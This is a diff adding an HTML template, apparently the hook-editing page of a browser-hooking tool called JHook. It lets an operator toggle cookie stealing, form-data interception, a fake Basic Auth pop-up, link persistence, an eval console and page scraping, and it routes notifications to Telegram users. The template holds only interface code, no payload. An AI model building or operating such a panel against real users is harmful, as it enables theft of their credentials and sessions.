@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/static/dark.css">
+    <link rel="stylesheet" href="/static/main.css">
+    <title>Edit Hook | JHook</title>
+</head>
+
+<body>
+    <form action="" method="post">
+        <h2>Edit {{ hook.name }}</h2>
+        <input type="text" required name="name" value="{{ hook.name }}" placeholder="Name">
+        <h3>Custom Code</h3>
+        <div id="editor">
+        </div>
+        <h3>Options</h3>
+        <div>
+            <div class="checkbox">
+                <input type="checkbox" {{ "checked" if hook.interceptSubmittedForms else "" }}
+                    name="interceptSubmittedForms" id="intercept-forms">
+                <label for="intercept-forms">Intercept submitted form data</label>
+            </div>
+            <div class="checkbox">
+                <input type="checkbox" {{ "checked" if hook.linksPersistence else "" }} name="linksPersistence"
+                    id="links-pers">
+                <label for="links-pers">Persistance trough links</label>
+            </div>
+            <div class="checkbox">
+                <input type="checkbox" {{ "checked" if hook.evalConsole else "" }} name="evalConsole" id="eval-console">
+                <label for="eval-console">Eval Console</label>
+            </div>
+            <div class="checkbox">
+                <input type="checkbox" {{ "checked" if hook.fakeBasicAuth else "" }} name="fakeBasicAuth"
+                    id="fake-auth">
+                <label for="fake-auth">Fake Basic Auth Pop-Up</label>
+            </div>
+            <div class="checkbox">
+                <input type="checkbox" {{ "checked" if hook.stealCookie else "" }} name="stealCookie" id="stealCookie">
+                <label for="fake-auth">Steal Cookies</label>
+            </div>
+            <div class="checkbox">
+                <input type="checkbox" {{ "checked" if hook.scrape else "" }} name="scrape" id="scrape">
+                <label for="scrape">Scrape Page</label>
+            </div>
+            <div>
+                <h3>Links Scraping</h3>
+                <div class="link-list" id="links-to-scrape">
+                    <span class="center" style="margin-top: 30px;">
+                        No URL's to scrape
+                    </span>
+                </div>
+                <div class="to-right">
+                    <input style="margin: 10px;" type="url" id="url-input" placeholder="Add URL...">
+                    <button type="button" id="add-url" style="margin-bottom: 0px;">➕</button>
+                </div>
+            </div>
+            <div>
+                <h3>Telegram Notification Receivers</h3>
+                <div class="link-list" id="users-to-notify">
+                    <span class="center" style="margin-top: 30px;">
+                        Nobody will receive Notifications
+                    </span>
+                </div>
+                <div class="to-right">
+                    <select class="tg-selector" id="tg-selector">
+                        <option selected>--None--</option>
+                        {% for user in telegram_users %}
+                        <option value="{{ user.id }}">{{ user.name }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" name="toScrape" id="toScrape" value="[]">
+        <input type="hidden" name="toNotify" id="toNotify" value="[]">
+        <input type="hidden" name="customCode" id="customCode" value="">
+        <div style="margin: 20px">
+            <button type="button" onclick="window.location ='{{  url_for('hook', id=hook.id) }}'">↩️</button>
+            <button type="submit">💾</button>
+        </div>
+    </form>
+</body>
+<script src="/static/ace/ace.js" type="text/javascript" charset="utf-8"></script>
+<script>
+    var urlsToScrape = {{ urls|tojson }};
+    var usersToNotify = {{ telegram_notifiers|tojson }};
+    window.addEventListener("DOMContentLoaded", () => {
+        document.getElementById("toScrape").value = "[]";
+        let list = document.getElementById("links-to-scrape");
+        const clickAddUrl = (add = true) => {
+            let input = document.getElementById("url-input");
+            if (add && urlsToScrape.find(e => e == input.value) === undefined) {
+                urlsToScrape.push(input.value);
+                input.value = "";
+            }
+            document.getElementById("toScrape").value = JSON.stringify(urlsToScrape);
+            list.innerHTML = "";
+            urlsToScrape.forEach(e => {
+                let container = document.createElement("div");
+                let link = document.createElement("a");
+                link.href = e;
+                link.innerText = e;
+                let btn = document.createElement("button");
+                btn.innerText = "❌";
+                btn.type = "button";
+                btn.onclick = () => {
+                    urlsToScrape = urlsToScrape.filter(el => el !== e);
+                    clickAddUrl(add = false);
+                };
+                container.appendChild(btn);
+                container.appendChild(link);
+                list.appendChild(container);
+            });
+        };
+        document.getElementById("add-url").addEventListener("click", clickAddUrl);
+        let telegramSelector = document.getElementById("tg-selector");
+        let userList = document.getElementById("users-to-notify");
+        const tgSelectorChange = (add = true) => {
+            let val = telegramSelector.value;
+            if (usersToNotify.find(a => a.id == val) !== undefined) {
+                telegramSelector.options[0].selected = true;
+                return;
+            }
+            if (add) {
+                usersToNotify.push({ id: val, u: telegramSelector.selectedOptions[0].innerText });
+                telegramSelector.options[0].selected = true;
+            }
+            document.getElementById("toNotify").value = JSON.stringify(usersToNotify.map(e => parseInt(e.id)));
+            userList.innerHTML = "";
+            usersToNotify.forEach(e => {
+                let btn = document.createElement("button");
+                btn.innerText = "❌";
+                btn.type = "button";
+                btn.onclick = () => {
+                    usersToNotify = usersToNotify.filter(el => el.u !== e.u);
+                    tgSelectorChange(add = false);
+                };
+                let container = document.createElement("div");
+                let text = document.createElement("span");
+                text.innerText = e.u;
+                container.appendChild(btn);
+                container.appendChild(text);
+                userList.appendChild(container);
+            });
+        };
+        telegramSelector.addEventListener("change", tgSelectorChange);
+        clickAddUrl(add = false);
+        tgSelectorChange(add = false);
+
+        var editor = ace.edit("editor");
+        editor.setTheme("ace/theme/monokai");
+        editor.session.setMode("ace/mode/javascript");
+        let el = document.getElementById("customCode");
+        editor.session.on('change', function (delta) {
+            el.value = editor.getValue();
+        });
+        editor.session.setValue({{ hook.customCode|tojson }});
+    });
+</script>
+
+</html>
